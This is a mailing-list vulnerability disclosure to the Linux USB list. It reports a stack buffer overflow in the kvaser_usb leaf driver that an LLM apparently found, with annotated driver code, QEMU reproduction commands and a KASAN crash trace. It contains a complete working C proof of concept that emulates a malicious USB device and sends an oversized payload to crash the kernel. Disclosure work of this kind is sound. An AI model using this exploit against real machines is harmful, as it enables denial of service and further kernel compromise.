Return-Path: <linux-usb+bounces-33420-lists+linux-usb=lfdr.de@vger.kernel.org>
Delivered-To: lists+linux-usb@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id KAyxM14glWnCLgIAu9opvQ
	(envelope-from <linux-usb+bounces-33420-lists+linux-usb=lfdr.de@vger.kernel.org>)
	for <lists+linux-usb@lfdr.de>; Wed, 18 Feb 2026 03:13:50 +0100
X-Original-To: lists+linux-usb@lfdr.de
Received: from sto.lore.kernel.org (sto.lore.kernel.org [172.232.135.74])
	by mail.lfdr.de (Postfix) with ESMTPS id 68990152A4E
	for <lists+linux-usb@lfdr.de>; Wed, 18 Feb 2026 03:13:50 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sto.lore.kernel.org (Postfix) with ESMTP id 6E9163013957
	for <lists+linux-usb@lfdr.de>; Wed, 18 Feb 2026 02:13:49 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 3F81A28D8F1;
	Wed, 18 Feb 2026 02:13:45 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=anthropic.com header.i=@anthropic.com header.b="KbPmfdx2"
X-Original-To: linux-usb@vger.kernel.org
Received: from mail-ot1-f47.google.com (mail-ot1-f47.google.com [209.85.210.47])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DAE3B2222B2
	for <linux-usb@vger.kernel.org>; Wed, 18 Feb 2026 02:13:42 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.210.47
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1771380824; cv=pass; b=Js50ZCv4Byp3MXB1KtNrMQT8OWdB75uijZrHC+rUaq+e9Wm4QmQNJowu0itQMqI1trWQqA/MvlM+AEsNnhhy9wqm98PDSpLvkrDD49wG8ouYFGOn/VshiA1x4TZhrgDhrU+DO/Um3sDSFe9Xf+VAm1tWC4QveSr1pczdmpWYeFs=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1771380824; c=relaxed/simple;
	bh=UgrAu1l4Vigrx/RQqbM7mZ0b3Q3eBEJ43r74DHte8lY=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Content-Type; b=mnuTbHqJ1gxE1wc9ak86+xBGy/f/77pVyJGcDtBXcEDMJc2uaiIOt74v6EsrDoRLJ6zpoRWOw4+33oWIzL9rmkVGp4EACW5e+ZWtB7BfKrPTgKEtbKWMIGrLD6d63nVga9FDctIN5je0xqGnpos4eRP/iEt3Ogm+9gTStMM4QD8=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=anthropic.com; spf=pass smtp.mailfrom=anthropic.com; dkim=pass (2048-bit key) header.d=anthropic.com header.i=@anthropic.com header.b=KbPmfdx2; arc=pass smtp.client-ip=209.85.210.47
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=anthropic.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=anthropic.com
Received: by mail-ot1-f47.google.com with SMTP id 46e09a7af769-7d18d72c034so714725a34.3
        for <linux-usb@vger.kernel.org>; Tue, 17 Feb 2026 18:13:42 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; t=1771380821; cv=none;
        d=google.com; s=arc-20240605;
        b=lyjUKcby2J0myT6Y188MvhQTdUOF0wteFCrreZFwOGxKW8Z8zvpnv04lwndEsQtrK+
         vrZ7iTC//fH2QGjiaCR6g2jPIroAd1mgznMtlG/B2DtWAvTUCK+l+TaJraNp1W31hTYq
         aHpVgseXfx+ylfPz3gb33VgUmVUmyipL7dMvzeZzZt4RqNt1S9cBR+zXw5ApkWaE9f+m
         BSbbiJd5czAk6wy2J7lBRrP1lw0YQFKVv6xhQT98EmqGB4g53H+vDrP6SYqKD+nZisTK
         ua5Q9ZIC0eVRIzpvhUntSeOldi+0GcfzDcB9O3s1pOt4/QxpfQMK8kX1UucFamFXU/zl
         G5ow==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=UuejgPKMbCqXcCzh1oStMI/KWk/IB5cfAgaRN8FjSBM=;
        fh=VimqKRrJCN9rdcfuq5onff2+63396vNbthBTDDSyxg0=;
        b=lPOw+FuJi/HSF30DA1TwQGSnhHRZCBVdq8+XOjObfXakQpsB6UDvZPZu6xW47PXzZq
         Uz8NMi1FCh+RZ+XVNwXTmG04Oc3uBTohn7nVX7AWG5to7T0JyiSWTNP51g2YQ8ZWceSC
         eVoPRqslu4PRK1F97ypapMbA6wMyVhyt6w/Py/shGWQxcrbtAjc1Jh1NtM5v5TDDZvr4
         1KAKdhUZHfwYWRxuXf+HnNAt3cQWZ8krBN1N+8Q6hXEXzKVZJeXqTaHSeu4IRY4Ssqna
         aQDtpUohXCWJXF62g461Ym+aYlEYqTIwHjXMT7t/phGjjAmjSE1ArqvfepN91ZrL6BK9
         fUTw==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=anthropic.com; s=google; t=1771380821; x=1771985621; darn=vger.kernel.org;
        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=UuejgPKMbCqXcCzh1oStMI/KWk/IB5cfAgaRN8FjSBM=;
        b=KbPmfdx2RYgKCoUjv5+deRIFOXmD3TpHEf3hKSrrF0vE0ZbroUnjE5mZA0eEHqHqwj
         s3DbNaLoCWAdoPTO9cvK+nT8URF9RkMww25ZyEFpLW1+4+woNFNEgOz0tloK4iaP2H70
         2yVm4GhS036jexSekkk4q1xWx5T3taIDi8uKoL0rG8WCSqLI/n7i0QQk4RBRy3orDC6i
         ZmJfDpoDVYV3rGIrjw5LYSBMKxrBF0fUNKOCqod9ZZjp8SS5JPmdpykXba9FsOcgNwxg
         DB41/PYt4cOBDMOsXOQZq+Q2jrUCA3GcOLvx1qiOYt/enuRFnbvN+zpgdcvdoQFseJoj
         iCXg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1771380821; x=1771985621;
        h=to:subject:message-id:date:from:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=UuejgPKMbCqXcCzh1oStMI/KWk/IB5cfAgaRN8FjSBM=;
        b=X53uiY+RMF7hQa0ycKqVtubYqhmAzG9RiTpUgx5OjOKRwK4dn7G+5aXDdRAtMZQP0d
         LEu2gI+LWbLW1M4eVyh1xYLOsPp71XduQYz36Vpvzlo7huXncDeaBE38U5mpcqD7hJVJ
         46BpA6OHQjsgP2u3X05OFEMSp09iI7ab6aMTfOVzuIhUSV+1eUQ0Sld1G9NDYuUl75KK
         86vyxYNzudkq4Q1oflrZDWaIwkU5JEAMKDepqs47LkXboGPx7RtQ+xCe33ltvzexXe1w
         pLt9kxXAN/AOcRh+tN0oNEo9jY1mhTWbDAnnK4sfMecsyvn5OHaqtcUM1FTM1hL4YyFA
         DuFg==
X-Gm-Message-State: AOJu0YyZDiTq3y/ORj/LGv0w8n+W7baK+taK07CZhKtRttroTn1f9LoF
	+NSAkq2pkux94m8mOPyNNuaX2dbJOfnnPnCO6P3bjlB23c5H5GEn+Wk0LrMvmJTSX0ospInbIUb
	O1S6vpmX/RNO7VtWTiVGdhgHnrwY802DQZyb6vsxItYH/FyKtRtOw3jonng==
X-Gm-Gg: AZuq6aLiahR9oiopXZ0QgptFqoDmvKTk+hElCbjtIs0yQGGn+jOfIvh6YwZy41MYzEl
	Um7B2SAcVNo12OBkQJgd83VIOB+ki1eB/CeCJJ9gSakbBagiEiqQD03SD+uHsB7Qci2PmZP3Na3
	V0BzA6vkUiZYB4m7YZvT4cAulq5haPnVxP8NcIiL1yIngej6AMAbDdueqNecMijcDszOCwRDRPP
	9VjnYU08vSmeGxLMBkRHJ0V3iIL39yZz+9ZTvzgjsRspbK4wwMo4vzp6STZzSEv+AIJskHgN1KM
	UX9i8HbbiLCneZxsG6tyu5CJ8PgXLLxvPBp8MRZs6WKepNZrf+qqxY1+9/Y=
X-Received: by 2002:a05:6808:3012:b0:455:7e2a:5e8e with SMTP id
 5614622812f47-4639ab29206mr7418438b6e.2.1771380820967; Tue, 17 Feb 2026
 18:13:40 -0800 (PST)
Precedence: bulk
X-Mailing-List: linux-usb@vger.kernel.org
List-Id: <linux-usb.vger.kernel.org>
List-Subscribe: <mailto:linux-usb+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-usb+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Nicholas Carlini <npc@anthropic.com>
Date: Tue, 17 Feb 2026 18:13:30 -0800
X-Gm-Features: AaiRm51ugsTeMKf-tWuYmt_BPwhvdQ77nYUrmAZ70rTKvqgc1xkZdVFc3r0wVgo
Message-ID: <CAOt5ifARcQqqGc65hHXR2JNTDg0hT0cF55Kb-6USEsqjEPM1nA@mail.gmail.com>
Subject: Stack buffer overflow (write) in kvaser_usb_leaf_wait_cmd via
 malicious USB
To: linux-usb@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	DMARC_POLICY_ALLOW(-0.50)[anthropic.com,reject];
	R_SPF_ALLOW(-0.20)[+ip4:172.232.135.74:c];
	R_DKIM_ALLOW(-0.20)[anthropic.com:s=google];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	MIME_TRACE(0.00)[0:+];
	MISSING_XM_UA(0.00)[];
	RCPT_COUNT_ONE(0.00)[1];
	TAGGED_RCPT(0.00)[linux-usb];
	ASN(0.00)[asn:63949, ipnet:172.232.128.0/19, country:SG];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[npc@anthropic.com,linux-usb@vger.kernel.org];
	FROM_HAS_DN(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[carlini.com:email,cmd.id:url,sto.lore.kernel.org:helo,sto.lore.kernel.org:rdns,mail.gmail.com:mid,anthropic.com:dkim];
	PRECEDENCE_BULK(0.00)[];
	TAGGED_FROM(0.00)[bounces-33420-lists,linux-usb=lfdr.de];
	TO_DN_NONE(0.00)[];
	RCVD_TLS_LAST(0.00)[];
	DKIM_TRACE(0.00)[anthropic.com:+]
X-Rspamd-Queue-Id: 68990152A4E
X-Rspamd-Action: no action

Hi --

I am a security researcher at Anthropic. I've been looking for bugs in
open source code with LLMs. I've found a stack buffer overflow in the
kernel that allows a malicious USB to fault the kernel immediately on
connection.

While an LLM found this vulnerability, I personally have validated it
on both qemu with kasan enabled, and on a separate physical Ubuntu
machine installed with default settings. I also wrote the patch
myself. This bug has been present since v3.8-rc1.

The specific bug occurs in
drivers/net/can/usb/kvaser_usb/kvaser_usb_leaf.c:

  static int kvaser_usb_leaf_wait_cmd(const struct kvaser_usb *dev, u8 id,
                      struct kvaser_cmd *cmd)   // <-- cmd points to
~32-byte struct from the caller
  {
      struct kvaser_cmd *tmp;
      void *buf;
      [...]

      buf = kzalloc(KVASER_USB_RX_BUFFER_SIZE, GFP_KERNEL);  //
3072-byte heap buffer
      [...]

      do {
          err = kvaser_usb_recv_cmd(dev, buf, KVASER_USB_RX_BUFFER_SIZE,
                        &actual_len);             // reads bulk USB
data from device
          [...]

          pos = 0;
          while (pos <= actual_len - CMD_HEADER_LEN) {
              tmp = buf + pos;                    // tmp->len is
byte[0] of USB data
                                                  // fully attacker-controlled
              [...]

              if (pos + tmp->len > actual_len) {  // Only checks len
fits in the 3072-byte
                  [...]                           // receive buffer,
not the destination
                  break;
              }

              if (tmp->id == id) {
                  memcpy(cmd, tmp, tmp->len);     // BUG: copies
tmp->len bytes (up to 255)
                  goto end;                       //      into cmd
(only ~32 bytes on stack)
              }

              [...]
          }
      } while (time_before(jiffies, to));

      [...]
  end:
      kfree(buf);

      if (err == 0)
          err = kvaser_usb_leaf_verify_size(dev, cmd);  // validates
minimum size only
                                                        // called
after the overflow already happened
      return err;
  }


This code will copy (without bounds check) arbitrary data from the USB
device into a fixed-size stack allocated struct from the caller:

static int kvaser_usb_leaf_get_software_info_inner(struct kvaser_usb *dev)
  {
      struct kvaser_cmd cmd;              // <-- ~32 byte struct on the stack
      int err;
      [...]

      err = kvaser_usb_leaf_send_simple_cmd(dev, CMD_GET_SOFTWARE_INFO, 0);
      if (err)                            // sends 4-byte command to
device on bulk OUT
          return err;

      // BUG: passes stack &cmd to wait_cmd
      err = kvaser_usb_leaf_wait_cmd(dev, CMD_GET_SOFTWARE_INFO_REPLY, &cmd);
      if (err)
          return err;
      [...]
  }

You can reproduce this with the provided C program below.

# compile
gcc -o repo repo.c -Wall -Wextra -Wno-sign-compare -lusbredirparser

# run
./repo > "$SERVER_LOG" 2>&1 &

qemu-system-x86_64 \
    $KVM_FLAG \
    -m 2G -smp 2 -nographic \
    -kernel "$DIR/bzImage" \
    -drive "file=$DIR/rootfs.qcow2,format=qcow2,snapshot=on" \
    -append "root=/dev/sda rw console=ttyS0 earlyprintk=serial nokaslr" \
    -usb -device usb-ehci,id=ehci \
    -chardev socket,id=usbredir0,host=127.0.0.1,port=$PORT \
    -device usb-redir,chardev=usbredir0,bus=ehci.0 \
    -no-reboot \
    > "$QEMU_LOG" 2>&1 &

/*
 * repo.c - Minimal usbredir server using libusbredirparser.
 * Emulates a malicious Kvaser Leaf USB device that triggers
 * a stack buffer overflow in kvaser_usb_leaf_wait_cmd().
 *
 * Build: gcc -o repo repo.c -lusbredirparser
 * Run:   ./repo   (listens on TCP :4000)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <usbredirparser.h>

static int sock;
static struct usbredirparser *parser;
static int payload_sent = 0;

#define CMD_GET_SOFTWARE_INFO_REPLY 39

/* --- I/O callbacks --- */

static int cb_read(void *priv, uint8_t *data, int count) {
    (void)priv;
    int n = read(sock, data, count);
    return n <= 0 ? -1 : n;
}

static int cb_write(void *priv, uint8_t *data, int count) {
    (void)priv;
    const uint8_t *p = data;
    int left = count;
    while (left > 0) {
        int n = write(sock, p, left);
        if (n <= 0) return -1;
        p += n; left -= n;
    }
    return count;
}

static void cb_log(void *priv, int level, const char *msg) {
    (void)priv; (void)level;
    fprintf(stderr, "  [lib] %s\n", msg);
}

static void do_flush(void) {
    while (usbredirparser_has_data_to_write(parser))
        usbredirparser_do_write(parser);
}

/* --- USB descriptors (Kvaser Leaf Lite) --- */

static const uint8_t dev_desc[] = {
    18, 0x01, 0x00, 0x02, 0xff, 0, 0, 64,
    0xfd, 0x0b, 0x0b, 0x00,  /* VID=0x0bfd PID=0x000b */
    0x00, 0x01, 0, 0, 0, 1,
};
static const uint8_t cfg_desc[] = {
    9, 0x02, 32, 0, 1, 1, 0, 0x80, 50,
    9, 0x04, 0, 0, 2, 0xff, 0, 0, 0,
    7, 0x05, 0x81, 0x02, 0x00, 0x02, 0,
    7, 0x05, 0x02, 0x02, 0x00, 0x02, 0,
};

/* --- Protocol callbacks --- */

static void on_hello(void *priv, struct usb_redir_hello_header *h) {
    (void)priv;
    fprintf(stderr, "[*] Peer: %s\n", h->version);

    struct usb_redir_ep_info_header ep;
    memset(&ep, 0, sizeof(ep));
    memset(ep.type, usb_redir_type_invalid, 32);
    ep.type[17] = usb_redir_type_bulk;
    ep.type[2]  = usb_redir_type_bulk;
    ep.max_packet_size[17] = 512;
    ep.max_packet_size[2]  = 512;
    usbredirparser_send_ep_info(parser, &ep);

    struct usb_redir_interface_info_header ii;
    memset(&ii, 0, sizeof(ii));
    ii.interface_count = 1;
    ii.interface_class[0] = 0xff;
    usbredirparser_send_interface_info(parser, &ii);

    struct usb_redir_device_connect_header dc;
    memset(&dc, 0, sizeof(dc));
    dc.speed = usb_redir_speed_high;
    dc.device_class = 0xff;
    dc.vendor_id = 0x0bfd;
    dc.product_id = 0x000b;
    dc.device_version_bcd = 0x0100;
    usbredirparser_send_device_connect(parser, &dc);
    fprintf(stderr, "[*] Sent device info (Kvaser Leaf VID=0bfd PID=000b)\n");
    do_flush();
}

static void on_reset(void *priv) { (void)priv; fprintf(stderr, "[*] RESET\n"); }

static void on_set_config(void *priv, uint64_t id,
        struct usb_redir_set_configuration_header *c) {
    (void)priv;
    fprintf(stderr, "[*] SET_CONFIG %d\n", c->configuration);
    struct usb_redir_configuration_status_header s = {
usb_redir_success, c->configuration };
    usbredirparser_send_configuration_status(parser, id, &s);
    do_flush();
}

static void on_get_config(void *priv, uint64_t id) {
    (void)priv;
    struct usb_redir_configuration_status_header s = { usb_redir_success, 1 };
    usbredirparser_send_configuration_status(parser, id, &s);
    do_flush();
}

static void on_set_alt(void *priv, uint64_t id,
        struct usb_redir_set_alt_setting_header *a) {
    (void)priv;
    struct usb_redir_alt_setting_status_header s = {
usb_redir_success, a->interface, a->alt };
    usbredirparser_send_alt_setting_status(parser, id, &s);
    do_flush();
}

static void on_get_alt(void *priv, uint64_t id,
        struct usb_redir_get_alt_setting_header *a) {
    (void)priv;
    struct usb_redir_alt_setting_status_header s = {
usb_redir_success, a->interface, 0 };
    usbredirparser_send_alt_setting_status(parser, id, &s);
    do_flush();
}

static void on_control(void *priv, uint64_t id,
        struct usb_redir_control_packet_header *cp, uint8_t *data, int
data_len) {
    (void)priv; (void)data_len;
    if (data) usbredirparser_free_packet_data(parser, data);

    fprintf(stderr, "[*] CTRL rt=%02x rq=%02x val=%04x len=%u\n",
            cp->requesttype, cp->request, cp->value, cp->length);

    if (cp->requesttype == 0x80 && cp->request == 0x06) {
        uint8_t dt = cp->value >> 8;
        const uint8_t *d = NULL; int dl = 0;
        if (dt == 1) { d = dev_desc; dl = sizeof(dev_desc); }
        else if (dt == 2) { d = cfg_desc; dl = sizeof(cfg_desc); }
        if (d) {
            int sl = dl < cp->length ? dl : cp->length;
            cp->status = usb_redir_success;
            cp->length = sl;
            uint8_t *buf = malloc(sl); memcpy(buf, d, sl);
            usbredirparser_send_control_packet(parser, id, cp, buf, sl);
            do_flush();
            return;
        }
    }
    if (cp->requesttype == 0x00 && cp->request == 0x09) {
        cp->status = usb_redir_success; cp->length = 0;
        usbredirparser_send_control_packet(parser, id, cp, NULL, 0);
        do_flush();
        return;
    }
    cp->status = usb_redir_stall; cp->length = 0;
    usbredirparser_send_control_packet(parser, id, cp, NULL, 0);
    do_flush();
}

static void on_bulk(void *priv, uint64_t id,
        struct usb_redir_bulk_packet_header *bp, uint8_t *data, int data_len) {
    (void)priv;
    fprintf(stderr, "[*] BULK ep=%02x len=%u data=%d\n", bp->endpoint,
bp->length, data_len);
    if (data && data_len >= 2)
        fprintf(stderr, "    cmd: len=%d id=%d\n", data[0], data[1]);
    if (data) usbredirparser_free_packet_data(parser, data);

    if (bp->endpoint & 0x80) {
        if (!payload_sent) {
            /* THE EXPLOIT: 200-byte response into ~32-byte stack buffer */
            uint8_t *p = malloc(200);
            memset(p, 'A', 200);
            p[0] = 200;                        /* cmd.len = 200 (OVERFLOW) */
            p[1] = CMD_GET_SOFTWARE_INFO_REPLY; /* cmd.id = 39 */
            bp->status = usb_redir_success;
            bp->length = 200; bp->length_high = 0;
            fprintf(stderr, "\n*** OVERFLOW PAYLOAD: 200 bytes ->
32-byte stack buffer ***\n\n");
            usbredirparser_send_bulk_packet(parser, id, bp, p, 200);
            payload_sent = 1;
        } else {
            bp->status = usb_redir_success; bp->length = 0; bp->length_high = 0;
            usbredirparser_send_bulk_packet(parser, id, bp, NULL, 0);
        }
    } else {
        bp->status = usb_redir_success; bp->length = 0; bp->length_high = 0;
        usbredirparser_send_bulk_packet(parser, id, bp, NULL, 0);
    }
    do_flush();
}

int main(void) {
    setvbuf(stderr, NULL, _IONBF, 0);

    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int one = 1; setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa = {.sin_family=AF_INET,
.sin_port=htons(4000), .sin_addr.s_addr=INADDR_ANY};
    if (bind(srv,(void*)&sa,sizeof(sa))<0) { perror("bind"); return 1; }
    listen(srv, 1);
    fprintf(stderr, "LISTEN :4000\n");

    sock = accept(srv, NULL, NULL);
    if (sock < 0) { perror("accept"); return 1; }
    fprintf(stderr, "CONNECTED\n");

    parser = usbredirparser_create();
    parser->log_func = cb_log;
    parser->read_func = cb_read;
    parser->write_func = cb_write;
    parser->hello_func = on_hello;
    parser->reset_func = on_reset;
    parser->set_configuration_func = on_set_config;
    parser->get_configuration_func = on_get_config;
    parser->set_alt_setting_func = on_set_alt;
    parser->get_alt_setting_func = on_get_alt;
    parser->control_packet_func = on_control;
    parser->bulk_packet_func = on_bulk;

    uint32_t caps[USB_REDIR_CAPS_SIZE] = {0};
    usbredirparser_caps_set_cap(caps, usb_redir_cap_connect_device_version);
    usbredirparser_caps_set_cap(caps, usb_redir_cap_ep_info_max_packet_size);
    usbredirparser_caps_set_cap(caps, usb_redir_cap_64bits_ids);
    usbredirparser_caps_set_cap(caps, usb_redir_cap_32bits_bulk_length);
    usbredirparser_init(parser, "minimal-kvaser", caps, USB_REDIR_CAPS_SIZE,
                        usbredirparser_fl_usb_host);
    do_flush();

    fprintf(stderr, "READY\n");
    while (usbredirparser_do_read(parser) == 0) {}

    fprintf(stderr, "DONE\n");
    usbredirparser_destroy(parser);
    close(sock); close(srv);
    return 0;
}

After running this, you should see a log file that looks like this:

LISTEN :4000
CONNECTED
READY
  [lib] usbredirparser: Peer version: qemu usb-redir guest 7.2.22,
using 64-bits ids
[*] Peer: qemu usb-redir guest 7.2.22
[*] Sent device info (Kvaser Leaf VID=0bfd PID=000b)
[*] RESET
[*] RESET
[*] CTRL rt=80 rq=06 val=0100 len=8
[*] CTRL rt=80 rq=06 val=0200 len=9
[*] CTRL rt=80 rq=06 val=0200 len=32
[*] RESET
[*] RESET
[*] CTRL rt=80 rq=06 val=0100 len=64
[*] RESET
[*] CTRL rt=80 rq=06 val=0100 len=18
[*] CTRL rt=80 rq=06 val=0200 len=9
[*] CTRL rt=80 rq=06 val=0200 len=32
[*] SET_CONFIG 1
[*] BULK ep=02 len=4 data=4
    cmd: len=4 id=38
[*] BULK ep=81 len=3072 data=0

*** OVERFLOW PAYLOAD: 200 bytes -> 32-byte stack buffer ***

And the KASAN error will show

[   12.777706] ==================================================================
[   12.780445] BUG: KASAN: stack-out-of-bounds in
kvaser_usb_leaf_wait_cmd+0x367/0x4e0
[   12.783321] Write of size 200 at addr ffff888008346ff8 by task kworker/0:1/10
[   12.786028]
[   12.786693] CPU: 0 UID: 0 PID: 10 Comm: kworker/0:1 Not tainted
6.19.0-rc8 #1 PREEMPT(voluntary)
[   12.786698] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   12.786700] Workqueue: usb_hub_wq hub_event
[   12.786706] Call Trace:
[   12.786708]  <TASK>
[   12.786710]  dump_stack_lvl+0x66/0xa0
[   12.786716]  print_report+0xd0/0x660
[   12.786721]  ? kvaser_usb_leaf_wait_cmd+0x367/0x4e0
[   12.786723]  ? __virt_addr_valid+0x208/0x3f0
[   12.786727]  ? kvaser_usb_leaf_wait_cmd+0x367/0x4e0
[   12.786730]  kasan_report+0xe4/0x120
[   12.786733]  ? kvaser_usb_leaf_wait_cmd+0x367/0x4e0
[   12.786737]  kasan_check_range+0x105/0x1b0
[   12.786740]  __asan_memcpy+0x3c/0x60
[   12.786744]  kvaser_usb_leaf_wait_cmd+0x367/0x4e0
[   12.786747]  ? lockdep_hardirqs_on_prepare+0xda/0x190
[   12.786753]  ? __pfx_kvaser_usb_leaf_wait_cmd+0x10/0x10
[   12.786756]  ? kfree+0x174/0x510
[   12.786760]  ? usb_alloc_urb+0x5d/0x140
[   12.786764]  ? kvaser_usb_leaf_get_software_info+0x178/0x770
[   12.786766]  ? usb_bulk_msg+0x88/0x5b0
[   12.786771]  kvaser_usb_leaf_get_software_info+0x192/0x770
[   12.786774]  ? __pfx_kvaser_usb_leaf_get_software_info+0x10/0x10
[   12.786777]  ? lockdep_init_map_type+0x5c/0x230
[   12.786781]  kvaser_usb_probe+0x30a/0x1370
[   12.786785]  ? _raw_spin_unlock_irqrestore+0x3f/0x50
[   12.786789]  ? lockdep_hardirqs_on_prepare+0xda/0x190
[   12.786793]  ? _raw_spin_unlock_irqrestore+0x3f/0x50
[   12.786796]  ? __pm_runtime_set_status+0x331/0x850
[   12.786802]  usb_probe_interface+0x279/0x980
[   12.786806]  really_probe+0x1c8/0x960
[   12.786811]  __driver_probe_device+0x187/0x3e0
[   12.786814]  driver_probe_device+0x45/0x120
[   12.786818]  __device_attach_driver+0x15d/0x280
[   12.786821]  ? __pfx___device_attach_driver+0x10/0x10
[   12.786824]  bus_for_each_drv+0x112/0x1a0
[   12.786827]  ? __pfx_bus_for_each_drv+0x10/0x10
[   12.786830]  ? _raw_spin_unlock_irqrestore+0x3f/0x50
[   12.786834]  __device_attach+0x193/0x3b0
[   12.786837]  ? __pfx___device_attach+0x10/0x10
[   12.786840]  ? do_raw_spin_unlock+0x53/0x220
[   12.786848]  device_initial_probe+0x78/0xa0
[   12.786851]  bus_probe_device+0x5d/0x140
[   12.786854]  device_add+0xde4/0x14b0
[   12.786859]  ? __pfx_device_add+0x10/0x10
[   12.786862]  ? mark_held_locks+0x40/0x70
[   12.786865]  ? _raw_spin_unlock_irqrestore+0x3f/0x50
[   12.786870]  usb_set_configuration+0xd65/0x19c0
[   12.786876]  usb_generic_driver_probe+0x78/0xb0
[   12.786880]  usb_probe_device+0xaf/0x310
[   12.786883]  really_probe+0x1c8/0x960
[   12.786887]  __driver_probe_device+0x187/0x3e0
[   12.786890]  driver_probe_device+0x45/0x120
[   12.786894]  __device_attach_driver+0x15d/0x280
[   12.786897]  ? __pfx___device_attach_driver+0x10/0x10
[   12.786900]  bus_for_each_drv+0x112/0x1a0
[   12.786903]  ? __pfx_bus_for_each_drv+0x10/0x10
[   12.786906]  ? _raw_spin_unlock_irqrestore+0x3f/0x50
[   12.786910]  __device_attach+0x193/0x3b0
[   12.786913]  ? __pfx___device_attach+0x10/0x10
[   12.786916]  ? do_raw_spin_unlock+0x53/0x220
[   12.786920]  device_initial_probe+0x78/0xa0
[   12.786923]  bus_probe_device+0x5d/0x140
[   12.786926]  device_add+0xde4/0x14b0
[   12.786930]  ? __pfx_device_add+0x10/0x10
[   12.786933]  ? usb_detect_static_quirks+0xc1/0x2f0
[   12.786937]  ? _raw_spin_unlock_irq+0x23/0x40
[   12.786941]  usb_new_device+0x7bd/0x1140
[   12.786945]  hub_event+0x24e5/0x45b0
[   12.786951]  ? __pfx_hub_event+0x10/0x10
[   12.786955]  ? lock_acquire+0x14d/0x2c0
[   12.786957]  ? process_one_work+0x7a8/0x19f0
[   12.786961]  ? lock_release+0xc5/0x260
[   12.786966]  process_one_work+0x826/0x19f0
[   12.786970]  ? __pfx_process_one_work+0x10/0x10
[   12.786974]  ? assign_work+0x167/0x240
[   12.786977]  worker_thread+0x4d9/0xe50
[   12.786981]  ? __pfx_worker_thread+0x10/0x10
[   12.786984]  ? __pfx_worker_thread+0x10/0x10
[   12.786986]  kthread+0x313/0x660
[   12.786990]  ? __pfx_kthread+0x10/0x10
[   12.786992]  ? ret_from_fork+0x6d/0x5d0
[   12.786995]  ? lock_release+0xc5/0x260
[   12.786998]  ? __pfx_kthread+0x10/0x10
[   12.787001]  ret_from_fork+0x4c8/0x5d0
[   12.787003]  ? __pfx_ret_from_fork+0x10/0x10
[   12.787006]  ? __switch_to+0x44/0xe50
[   12.787009]  ? __switch_to_asm+0x39/0x70
[   12.787013]  ? __switch_to_asm+0x33/0x70
[   12.787015]  ? __pfx_kthread+0x10/0x10
[   12.787018]  ret_from_fork_asm+0x1a/0x30
[   12.787023]  </TASK>
[   12.787024]
[   12.937230] The buggy address belongs to stack of task kworker/0:1/10
[   12.939617]  and is located at offset 32 in frame:
[   12.941431]  kvaser_usb_leaf_get_software_info+0x0/0x770
[   12.943405]
[   12.944069] This frame has 1 object:
[   12.945451]  [32, 64) 'cmd'
[   12.945453]
[   12.947219] The buggy address belongs to the physical page:
[   12.949279] page: refcount:0 mapcount:0 mapping:0000000000000000
index:0x0 pfn:0x8346
[   12.952160] flags: 0x100000000000000(node=0|zone=1)
[   12.954006] raw: 0100000000000000 ffffea000020d188 ffffea000020d188
0000000000000000
[   12.956828] raw: 0000000000000000 0000000000000000 00000000ffffffff
0000000000000000
[   12.959668] page dumped because: kasan: bad access detected
[   12.961751]
[   12.962418] Memory state around the buggy address:
[   12.964218]  ffff888008346f00: 00 00 f1 f1 f1 f1 f1 f1 04 f2 00 f3
f3 f3 00 00
[   12.966877]  ffff888008346f80: 00 00 00 00 00 00 00 00 00 00 00 f1
f1 f1 f1 00
[   12.969548] >ffff888008347000: 00 00 00 f3 f3 f3 f3 00 00 00 00 00
00 00 00 00
[   12.972204]                             ^
